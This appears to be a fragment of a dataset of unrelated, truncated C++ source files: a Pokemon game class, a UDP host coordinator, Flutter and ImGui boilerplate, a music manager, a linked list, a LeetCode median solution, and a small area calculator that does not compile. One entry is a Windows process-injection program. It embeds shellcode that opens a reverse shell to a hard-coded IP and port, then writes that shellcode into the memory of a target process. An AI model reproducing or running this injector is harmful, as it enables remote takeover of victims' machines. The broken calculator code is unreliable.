== 6) {\r\n        std::cout << \"Votre equipe de combat est maintenant complete !\" << std::endl;\r\n    } else {\r\n        std::cout << \"Vous avez s\u00e9lectionne \" << battlePokemon.size() << \" Pokemon.\" << std::endl;\r\n    }\r\n}*/\r\n\r\nvoid PokemonParty::displayParty() const {\r\n    if (battlePokemon.empty()) {\r\n        std::cout << \"Vous n'avez pas de Pok\u00e9mon dans votre \u00e9quipe de combat.\" << std::endl;\r\n    } else {\r\n        std::cout << \"********* Equipe Pokemon *********\" << std::endl;\r\n        for (Pokemon* pokemon : battlePokemon) {\r\n            pokemon->displayInfo();\r\n        }\r\n    }\r\n}\r\n\r\nvoid PokemonParty::chooseBattlePokemon(std::vector<Pokemon*>& capturedPokemon, int numToChoose) {\r\n    battlePokemon.clear();  // Vider l'\u00e9quipe actuelle\r\n\r\n    if (capturedPokemon.empty()) {\r\n        std::cout << \"Vous n'avez capture aucun Pokemon.\" << std::endl;\r\n        return;\r\n    }\r\n\r\n    std::cout << \"Choisissez \" << numToChoose << \" Pokemon parmi les captures :\" << std::endl;\r\n\r\n    // Afficher les Pok\u00e9mon captur\u00e9s avec leurs index\r\n    for (size_t i = 0; i < capturedPokemon.size(); ++i) {\r\n        std::cout << i + 1 << \": \" << capturedPokemon[i]->getName() << std::endl;\r\n    }\r\n\r\n    int choice;\r\n    while (battlePokemon.size() < numToChoose) {\r\n        std::cout << \"Quel Pokemon voulez-vous ajouter a votre equipe ? (Numero entre 1 et \" << capturedPokemon.size() << \") : \";\r\n        std::cin >> choice;\r\n\r\n        // V\u00e9rifier si le choix est valide\r\n        if (choice < 1 || choice > static_cast<int>(capturedPokemon.size())) {\r\n            std::cout << \"Choix invalide. Essayez a nouveau.\" << std::endl;\r\n            continue;\r\n        }\r\n\r\n        // V\u00e9rifier si le Pok\u00e9mon a d\u00e9j\u00e0 \u00e9t\u00e9 s\u00e9lectionn\u00e9\r\n        Pokemon* selectedPokemon = capturedPokemon[choice - 1];\r\n        if (std::find(battlePokemon.begin(), battlePokemon.end(), selectedPokemon) != battlePokemon.end()) {\r\n            std::cout << \"Vous avez deje selectionne ce Pok\u00e9mon. Choisissez-en un autre.\" << std::endl;\r\n            continue;\r\n        }\r\n\r\n        // Ajouter le Pok\u00e9mon s\u00e9lectionn\u00e9 \u00e0 l'\u00e9quipe de combat\r\n        battlePokemon.push_back(selectedPokemon);\r\n        std::cout << selectedPokemon->getName() << \" a ete ajoute a votre equipe de combat !\" << std::endl;\r\n\r\n        // Si le nombre de Pok\u00e9mon choisis est atteint\r\n        if (battlePokemon.size() == numToChoose) {\r\n            std::cout << \"Vous avez choisi \" << numToChoose << \" Pokemon. Votre equipe est complete !\" << std::endl;\r\n            break;\r\n        }\r\n    }\r\n}\r\n\r\n\r\nvoid PokemonParty::RemovePokemonFromPartybyName(std::vector<Pokemon*>& capturedPokemon, string name, int i){\r\n    Pokemon* onepokemon = battlePokemon.at(i);\r\n    capturedPokemon.push_back(onepokemon);\r\n    std::cout << \"Au revoir \" << onepokemon -> getName() << std::endl;\r\n}\r\n\r\nvoid PokemonParty::disband(std::vector <Pokemon *> capturedPokemon) {\r\n    std::cout << \"********* Retour dans le PC **********\" << std::endl;\r\n    for (Pokemon* p : battlePokemon) {\r\n        linkedPokeball ->addPokemon(p, capturedPokemon);\r\n        std",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <cstring>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <thread>\n#include <chrono>\n#include <atomic>\n#include <mutex>\n#include <algorithm>\n#include <netdb.h>\n#include <cstdarg>\nconst int PORT = 8080;\nconst int MAX_RETRIES = 5;\nconst int RETRY_INTERVAL_MS = 1000;\n\nstd::vector<std::string> hosts;\nstd::string my_hostname;\nstd::atomic<bool> all_ready(false);\nstd::mutex ready_mutex;\nstd::vector<bool> ready_hosts;\n\nvoid log_debug(const char* format, ...) {\n    va_list args;\n    va_start(args, format);\n    fprintf(stderr, \"DEBUG: \");\n    vfprintf(stderr, format, args);\n    fprintf(stderr, \"\\n\");\n    va_end(args);\n}\n\nstd::vector<std::string> read_hostfile(const std::string& filename) {\n    std::vector<std::string> hosts;\n    std::ifstream file(filename);\n    std::string line;\n    while (std::getline(file, line)) {\n        hosts.push_back(line);\n    }\n    log_debug(\"Read %zu hosts from hostfile\", hosts.size());\n    return hosts;\n}\n\nvoid send_message(int sock, const std::string& message, const std::string& dest_hostname) {\n    struct addrinfo hints, *res;\n    memset(&hints, 0, sizeof hints);\n    hints.ai_family = AF_INET;\n    hints.ai_socktype = SOCK_DGRAM;\n\n    log_debug(\"Resolving hostname: %s\", dest_hostname.c_str());\n    int status = getaddrinfo(dest_hostname.c_str(), std::to_string(PORT).c_str(), &hints, &res);\n    if (status != 0) {\n        log_debug(\"getaddrinfo error: %s\", gai_strerror(status));\n        return;\n    }\n\n    log_debug(\"Sending message to %s: %s\", dest_hostname.c_str(), message.c_str());\n    sendto(sock, message.c_str(), message.length(), 0, res->ai_addr, res->ai_addrlen);\n\n    freeaddrinfo(res);\n}\n\nvoid sender_thread(int sock) {\n    log_debug(\"Sender thread started\");\n    while (!all_ready) {\n        for (size_t i = 0; i < hosts.size(); ++i) {\n            if (hosts[i] != my_hostname && !ready_hosts[i]) {\n                send_message(sock, \"READY \" + my_hostname, hosts[i]);\n            }\n        }\n        std::this_thread::sleep_for(std::chrono::milliseconds(RETRY_INTERVAL_MS));\n    }\n    log_debug(\"Sender thread finished\");\n}\n\nvoid receiver_thread(int sock) {\n    log_debug(\"Receiver thread started\");\n    char buffer[1024];\n    struct sockaddr_in sender_addr;\n    socklen_t sender_addr_len = sizeof(sender_addr);\n\n    while (!all_ready) {\n        int bytes_received = recvfrom(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sender_addr, &sender_addr_len);\n        if (bytes_received > 0) {\n            buffer[bytes_received] = '\\0';  // Null-terminate the received data\n            log_debug(\"Received message: %s\", buffer);\n            std::string message(buffer);\n            if (message.substr(0, 5) == \"READY\") {\n                std::string sender_hostname = message.substr(6);\n                auto it = std::find(hosts.begin(), hosts.end(), sender_hostname);\n                if (it != hosts.end()) {\n                    int index = std::distance(hosts.begin(), it);\n                    std::lock_guard<std::mutex> lock(ready_mutex);\n                    ready_hosts[index] = true;\n                    \n                    log_debug(\"Marking %s as ready\", sender_hostname.c_str());\n                    send_message(sock, \"ACK \" + my_hostname, sender_hostname);\n\n                    if (std::all_of(ready_hosts.begin(), ready_hosts.end(), [](bool v) { return v; })) {\n                        all_ready = true;\n                        fprintf(stderr, \"READY\\n\");\n                        log_debug(\"All hosts are ready\");\n                    }\n                }\n            } else if (message.substr(0, 3) == \"ACK\") {\n                std::string sender_hostname = message.substr(4);\n                auto it = std::find(hosts.begin(), hosts.end(), sender_hostname);\n                if (it != hosts.end()) {\n                    int index = std::distance(hosts.begin(), it);\n                    std::lock_guard<std::mutex> lock(ready_mutex);\n                    ready_hosts[index] = true;\n                    log_debug(\"Received ACK from %s\", sender_hostname.c_str());\n                }\n            }\n        }\n    }\n    log_debug(\"Receiver thread finished\");\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 3) {\n        std::cerr << \"Usage: \" << argv[0] << \" <hostfile> <my_hostname>\" << std::endl;\n        return 1;\n    }\n\n    std::string hostfile = argv[1];\n    my_hostname = argv[2];\n\n    log_debug(\"Starting coordinator. Hostname: %s\", my_hostname.c_str());\n\n    hosts = read_hostfile(hostfile);\n    ready_hosts.resize(hosts.size(), false);\n    auto self_it = std::find(hosts.begin(), hosts.end(), my_hostname);\nif (self_it != hosts.end()) {\n    int self_index = std::distance(hosts.begin(), self_it);\n    ready_hosts[self_index] = true;\n    log_debug(\"Set own status (index %d) to ready\", self_index);\n}\n\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    if (sock < 0) {\n        log_debug(\"Failed t",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_bluetooth_classic\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <windows.h>\n#include <tchar.h>\n#include <psapi.h>\n#include <stdio.h>\n#include <tlhelp32.h>\n\nvoid PrintProcessNameAndID(DWORD processID, const WCHAR* target, DWORD& foundPID) {\n    TCHAR szProcessName[MAX_PATH] = TEXT(\"<unknown>\");\n\n    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);\n\n    if (hProcess != NULL) {\n        HMODULE hMod;\n        DWORD cbNeeded;\n\n        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {\n            GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));\n        }\n\n        if (_wcsicmp(szProcessName, target) == 0) {\n            foundPID = processID;\n            wprintf(L\"Target process found: %s (PID: %u)\\n\", szProcessName, processID);\n        }\n\n        CloseHandle(hProcess);\n    }\n}\n\nvoid PrintAllProcesses(const WCHAR* target, DWORD& foundPID) {\n    DWORD processes[1024], cbNeeded, processCount;\n\n    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {\n        printf(\"EnumProcesses failed.\\n\");\n        return;\n    }\n\n    processCount = cbNeeded / sizeof(DWORD);\n\n    for (unsigned int i = 0; i < processCount; i++) {\n        if (processes[i] != 0) {\n            PrintProcessNameAndID(processes[i], target, foundPID);\n            if (foundPID != 0) {\n                break;\n            }\n        }\n    }\n}\n\nint main(int argc, char* argv[]) {\n    if (argc < 2) {\n        printf(\"Usage: <exe> <Process Name>\\n\");\n        return EXIT_FAILURE;\n    }\n\n    DWORD PID = 0, TID = NULL;\n    WCHAR target[MAX_PATH];\n    size_t convertedChars = 0;\n\n    mbstowcs_s(&convertedChars, target, MAX_PATH, argv[1], _TRUNCATE);\n\n    PrintAllProcesses(target, PID);\n\n    if (PID == 0) {\n        printf(\"Target process not found.\\n\");\n        return EXIT_FAILURE;\n    }\n\n    unsigned char R0m4InShell[] =\n        \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n        \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n        \"\\x18\\x48\\x8b\\x52\\x20\\x4d\\x31\\xc9\\x48\\x0f\\xb7\\x4a\\x4a\\x48\"\n        \"\\x8b\\x72\\x50\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n        \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n        \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\"\n        \"\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\"\n        \"\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\"\n        \"\\x01\\xd0\\xe3\\x56\\x4d\\x31\\xc9\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\"\n        \"\\x48\\x01\\xd6\\x48\\x31\\xc0\\x41\\xc1\\xc9\\x0d\\xac\\x41\\x01\\xc1\"\n        \"\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\"\n        \"\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\"\n        \"\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\"\n        \"\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\"\n        \"\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\"\n        \"\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\"\n        \"\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\"\n        \"\\x89\\xe5\\x49\\xbc\\x02\\x00\\x11\\x5c\\xac\\x1a\\xb7\\x42\\x41\\x54\"\n        \"\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\"\n        \"\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\"\n        \"\\x00\\xff\\xd5\\x6a\\x0a\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\"\n        \"\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\"\n        \"\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\"\n        \"\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\"\n        \"\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5\\xe8\\x93\\x00\\x00\\x00\"\n        \"\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\"\n        \"\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\"\n        \"\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\"\n        \"\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\\xba\"\n        \"\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\"\n        \"\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\"\n        \"\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\"\n        \"\\x00\\x40\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\"\n        \"\\x30\\xff\\xd5\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\"\n        \"\\xff\\xce\\xe9\\x3c\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\"\n        \"\\x85\\xf6\\x75\\xb4\\x41\\xff\\xe7\\x58\\x6a\\x00\\x59\\xbb\\xe0\\x1d\"\n        \"\\x2a\\x0a\\x41\\x89\\xda\\xff\\xd5\";\n\n\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);\n    if (hProcess == NULL) {\n        printf(\"Failed to open process (PID: %ld), error: %ld\\n\", PID, GetLastError());\n        return EXIT_FAILURE;\n    }\n\n    LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(R0m4InShell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);\n    if (rBuffer == NULL) {\n        printf(\"Failed to allocate memory in target process.\\n\");\n        CloseHandle(hProcess);\n        return EXIT_FAILURE;\n    }\n\n    if (!WriteProcessMemory(hProcess, rBuffer, R0m4InShell, sizeof(R0m4InShell), NULL)) {\n        printf(\"Failed to write shellcode to target process.\\n\");\n        CloseHandle(hProcess);\n        retu",
    "#include \"MusicManager.hpp\"\n\nGUI::MusicManager::MusicManager() : _volume(50.0f), _isMuted(false) {\n    Config &config = Config::getInstance(\"client/config.json\");\n    loadMusic(config.get(\"musics_config_path\").value_or(DEFAULT_MUSIC_CONFIG));\n    _musicsPath = config.get(\"musics_path\").value_or(DEFAULT_MUSIC_PATH);\n}\n\nvoid GUI::MusicManager::loadMusic(const std::string& configPath) {\n    libconfig::Config cfg;\n    try {\n        cfg.readFile(configPath.c_str());\n    } catch (const libconfig::FileIOException &fioex) {\n        throw std::runtime_error(\"I/O error while reading file.\");\n    } catch (const libconfig::ParseException &pex) {\n        throw std::runtime_error(\"Parse error at \" + std::string(pex.getFile()) + \":\" + std::to_string(pex.getLine()) + \" - \" + pex.getError());\n    }\n\n    const libconfig::Setting& root = cfg.getRoot();\n    if (root.exists(\"musics\")) {\n        const libconfig::Setting& musicSettings = root[\"musics\"];\n        for (int i = 0; i < musicSettings.getLength(); ++i) {\n            const libconfig::Setting& music = musicSettings[i];\n            std::string name, path;\n            if (music.lookupValue(\"name\", name) && music.lookupValue(\"path\", path)) {\n                auto musicPtr = std::make_shared<sf::Music>();\n                std::string fullPath = _musicsPath + path;\n                if (!musicPtr->openFromFile(fullPath)) {\n                    Logger::log(LogLevel::ERR, \"Failed to load music: \" + fullPath);\n                }\n                _musicMap[name] = musicPtr;\n                Logger::log(LogLevel::INFO, \"Loaded music: \" + name + \" from \" + fullPath);\n            }\n        }\n    }\n}\n\nvoid GUI::MusicManager::setVolume(float volume) {\n    _volume = std::clamp(volume, 0.0f, 100.0f);\n    std::cout << \"Setting volume to: \" << _volume << std::endl;\n    _updateVolume();\n}\n\nfloat GUI::MusicManager::getVolume() const {\n    std::cout << \"Current volume: \" << _volume << std::endl;\n    return _volume;\n}\n\nvoid GUI::MusicManager::toggleMute() {\n    _isMuted = !_isMuted;\n    _updateVolume();\n}\n\nvoid GUI::MusicManager::setMute(bool mute) {\n    _isMuted = mute;\n    _updateVolume();\n}\n\nvoid GUI::MusicManager::setMusic(const std::string& musicName, bool loop) {\n    if (_musicMap.find(musicName) != _musicMap.end()) {\n        if (_currentMusic) {\n            _currentMusic->stop();\n        }\n        _currentMusic = _musicMap[musicName];\n        _currentMusic->setLoop(loop);\n        _currentMusic->setVolume(_isMuted ? 0.0f : _volume);\n        _currentMusic->play();\n    } else {\n        throw std::runtime_error(\"Music not found: \" + musicName);\n    }\n}\n\nvoid GUI::MusicManager::_updateMute() {\n    if (_isMuted) {\n        _volumeBeforeMute = _volume;\n        _volume = 0.0f;\n    } else {\n        _volume = _volumeBeforeMute;\n    }\n}\n\nvoid GUI::MusicManager::_updateVolume() {\n    if (_currentMusic) {\n        _currentMusic->setVolume(_isMuted ? 0.0f : _volume);\n    }\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint main() {\r\n    int choice;\r\n    find luas;\r\n\r\n    cout << \"Pilih bentuk yang ingin dihitung luasnya:\\n\";\r\n    cout << \"1. Persegi\\n\";\r\n    cout << \"2. Persegi Panjang\\n\";\r\n    cout << \"3. Segitiga\\n\";\r\n    cout << \"Masukkan pilihan (1/2/3): \";\r\n    cin >> choice;\r\n\r\n    switch (choice) {\r\n        case 1: {\r\n            find sisi;\r\n            cout << \"Masukkan panjang sisi persegi: \";\r\n            cin >> sisi;\r\n            luas = sisi * sisi;\r\n            cout << \"Luas persegi adalah: \" << luas << endl;\r\n            break;\r\n        }\r\n        case 2: {\r\n            find panjang, lebar;\r\n            cout << \"Masukkan panjang persegi panjang: \";\r\n            cin >> panjang;\r\n            cout << \"Masukkan lebar persegi panjang: \";\r\n            cin >> lebar;\r\n            luas = panjang * lebar;\r\n            cout << \"Luas persegi panjang adalah: \" << luas << endl;\r\n            break;\r\n        }\r\n        case 3: {\r\n            find alas, tinggi;\r\n            cout << \"Masukkan alas segitiga: \";\r\n            cin >> alas;\r\n            cout << \"Masukkan tinggi segitiga: \";\r\n            cin >> tinggi;\r\n            luas = 0.5 * alas * tinggi;\r\n            cout << \"Luas segitiga adalah: \" << luas << endl;\r\n            break;\r\n        }\r\n        default:\r\n            cout << \"Pilihan tidak valid. Silakan pilih 1, 2, atau 3.\" << endl;\r\n            break;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"train.h\"\n\ntrain::train(std::string config){\n    this->size = 0;\n    std::string content;\n    int pos, tempCost,\n        ptrCursor = 1, count = 0; \n    std::stringstream ss;\n    trainCar* nodePtr;\n    long unsigned int i = 0;\n\n    while( i < config.size()){\n        if(config[i] == ',')\n            count++;\n        i++;\n    }\n\n    if(count > 0){\n        pos = config.find(',');\n        content = config.substr(0, pos);\n        config.erase(0,(pos+1));\n        ss.clear();\n        ss << content;\n        ss >> tempCost;\n        this->head = new trainCar(tempCost);\n        \n        this->size++;\n        nodePtr = this->head;\n        tempCost = 0;\n\n    \n        while(ptrCursor < count){\n            pos = config.find(',');\n            content = config.substr(0, pos);\n            config.erase(0,(pos+1));\n\n            ss.clear();\n            ss << content;\n            ss >> tempCost;\n            nodePtr->next = new trainCar(tempCost);\n            this->size++;\n            \n            nodePtr = nodePtr->next;\n            ptrCursor++;\n            tempCost = 0;\n        }\n        \n        ss.clear();\n        ss << config;\n        ss >> tempCost;\n        nodePtr->next = new trainCar(tempCost);\n        this->size++;\n        nodePtr = nodePtr->next;\n    }\n\n    else{\n        ss.clear();\n        ss << config;\n        ss >> tempCost;\n        this->head = new trainCar(tempCost);\n        this->size++;\n    }\n\n}\n\ntrain::~train(){\n    while(this->head){\n        trainCar* nodePtr = head;\n        this->head = this->head->next;\n        delete nodePtr;\n    }\n   \n}\n\nint train::calcTotalCost(){\n    int total = 0;\n    trainCar* nodePtr = this->head;\n\n    while(nodePtr){\n        total += nodePtr->getCost();\n        nodePtr = nodePtr->next;\n    }\n    \n    std::cout << \"Total Train Cost: \";\n    std::cout << total;\n    std::cout << std::endl;\n\n    return total;\n}\n\nvoid train::addCar(int newCost){\n    trainCar* nodePtr = head;\n\n    if(nodePtr){\n        while(nodePtr->next) //traverses to the last node\n            nodePtr = nodePtr->next;\n        \n        nodePtr->next = new trainCar(newCost);\n    }\n    \n    else if(!nodePtr){\n        this->head = new trainCar(newCost);\n        this->size++;\n    }\n    \n}",
    "// dear imgui: Platform Binding for Android native app\r\n// This needs to be used along with the OpenGL 3 Renderer (imgui_impl_opengl3)\r\n\r\n// Implemented features:\r\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy AKEYCODE_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\r\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen/Pen.\r\n// Missing features:\r\n//  [ ] Platform: Clipboard support.\r\n//  [ ] Platform: Gamepad support. Enable with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\r\n//  [ ] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'. FIXME: Check if this is even possible with Android.\r\n//  [ ] Platform: Multi-viewport support (multiple windows). Not meaningful on Android.\r\n// Important:\r\n//  - Consider using SDL or GLFW backend on Android, which will be more full-featured than this.\r\n//  - FIXME: On-screen keyboard currently needs to be enabled by the application (see examples/ and issue #3446)\r\n//  - FIXME: Unicode character inputs needs to be passed by Dear ImGui by the application (see examples/ and issue #3446)\r\n\r\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\r\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\r\n// Learn about Dear ImGui:\r\n// - FAQ                  https://dearimgui.com/faq\r\n// - Getting Started      https://dearimgui.com/getting-started\r\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\r\n// - Introduction, links and more at the top of imgui.cpp\r\n\r\n// CHANGELOG\r\n// (minor and older changes stripped away, please see git history for details)\r\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introduced in 1.87 to ImGuiMod_XXX (old names still supported).\r\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago) with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\r\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\r\n//  2022-01-10: Inputs: calling new io.AddKeyEvent(), io.AddKeyModsEvent() + io.SetKeyEventNativeData() API (1.87+). Support for full ImGuiKey range.\r\n//  2021-03-04: Initial version.\r\n\r\n#include \"imgui.h\"\r\n#ifndef IMGUI_DISABLE\r\n#include \"imgui_impl_android.h\"\r\n#include <time.h>\r\n#include <android/native_window.h>\r\n#include <android/input.h>\r\n#include <android/keycodes.h>\r\n#include <android/log.h>\r\n\r\n// Android data\r\nstatic double                                   g_Time = 0.0;\r\nstatic ANativeWindow*                           g_Window;\r\nstatic char                                     g_LogTag[] = \"ImGuiExample\";\r\n\r\nstatic ImGuiKey ImGui_ImplAndroid_KeyCodeToImGuiKey(int32_t key_code)\r\n{\r\n    switch (key_code)\r\n    {\r\n        case AKEYCODE_TAB:                  return ImGuiKey_Tab;\r\n        case AKEYCODE_DPAD_LEFT:            return ImGuiKey_LeftArrow;\r\n        case AKEYCODE_DPAD_RIGHT:           return ImGuiKey_RightArrow;\r\n        case AKEYCODE_DPAD_UP:              return ImGuiKey_UpArrow;\r\n        case AKEYCODE_DPAD_DOWN:            return ImGuiKey_DownArrow;\r\n        case AKEYCODE_PAGE_UP:              return ImGuiKey_PageUp;\r\n        case AKEYCODE_PAGE_DOWN:            return ImGuiKey_PageDown;\r\n        case AKEYCODE_MOVE_HOME:            return ImGuiKey_Home;\r\n        case AKEYCODE_MOVE_END:             return ImGuiKey_End;\r\n        case AKEYCODE_INSERT:               return ImGuiKey_Insert;\r\n        case AKEYCODE_FORWARD_DEL:          return ImGuiKey_Delete;\r\n        case AKEYCODE_DEL:                  return ImGuiKey_Backspace;\r\n        case AKEYCODE_SPACE:                return ImGuiKey_Space;\r\n        case AKEYCODE_ENTER:                return ImGuiKey_Enter;\r\n        case AKEYCODE_ESCAPE:               return ImGuiKey_Escape;\r\n        case AKEYCODE_APOSTROPHE:           return ImGuiKey_Apostrophe;\r\n        case AKEYCODE_COMMA:                return ImGuiKey_Comma;\r\n        case AKEYCODE_MINUS:                return ImGuiKey_Minus;\r\n        case AKEYCODE_PERIOD:               return ImGuiKey_Period;\r\n        case AKEYCODE_SLASH:                return ImGuiKey_Slash;\r\n        case AKEYCODE_SEMICOLON:            return ImGuiKey_Semicolon;\r\n        case AKEYCODE_EQUALS:               return ImGuiKey_Equal;\r\n        case AKEYCODE_LEFT_BRACKET:         return ImGuiKey_LeftBracket;\r\n        case AKEYCODE_BACKSLASH:            return ImGuiKey_Backslash;\r\n        case AKEYCODE_RIGHT_BRACKET:        return ImGuiKey_RightBracket;\r\n        case AKEYCODE_GRAVE:                return ImGuiKey_GraveAccent;\r\n        case AKEYCODE_CAPS_LOCK:            return ImGuiKey_CapsLock;\r\n        case AKEYCODE_SCROLL_LOCK:          ",
    "// code taken from: https://leetcode.com/problems/median-of-two-sorted-arrays/solutions/5492177/easy-and-simple-c-approach-binary-search/\n#include <pybind11/pybind11.h>\n#include <pybind11/stl.h>\n#include <vector>\nnamespace py = pybind11;\nusing namespace std;\n\ndouble findMedianSortedArrays(vector<int> &nums1, vector<int> &nums2) {\n        int n1 = nums1.size(), n2 = nums2.size();\n        \n        // Ensure nums1 is the smaller array for simplicity\n        if (n1 > n2)\n            return findMedianSortedArrays(nums2, nums1);\n        \n        int n = n1 + n2;\n        int left = (n1 + n2 + 1) / 2; // Calculate the left partition size\n        int low = 0, high = n1;\n        \n        while (low <= high) {\n            int mid1 = (low + high) >> 1; // Calculate mid index for nums1\n            int mid2 = left - mid1; // Calculate mid index for nums2\n            \n            int l1 = INT_MIN, l2 = INT_MIN, r1 = INT_MAX, r2 = INT_MAX;\n            \n            // Determine values of l1, l2, r1, and r2\n            if (mid1 < n1)\n                r1 = nums1[mid1];\n            if (mid2 < n2)\n                r2 = nums2[mid2];\n            if (mid1 - 1 >= 0)\n                l1 = nums1[mid1 - 1];\n            if (mid2 - 1 >= 0)\n                l2 = nums2[mid2 - 1];\n            \n            if (l1 <= r2 && l2 <= r1) {\n                // The partition is correct, we found the median\n                if (n % 2 == 1)\n                    return max(l1, l2);\n                else\n                    return ((double)(max(l1, l2) + min(r1, r2))) / 2.0;\n            }\n            else if (l1 > r2) {\n                // Move towards the left side of nums1\n                high = mid1 - 1;\n            }\n            else {\n                // Move towards the right side of nums1\n                low = mid1 + 1;\n            }\n        }\n        \n        return 0; // If the code reaches here, the input arrays were not sorted.\n}\n\n\nPYBIND11_MODULE(mtsa, m) {\n    m.doc() = \"mtsa\"; 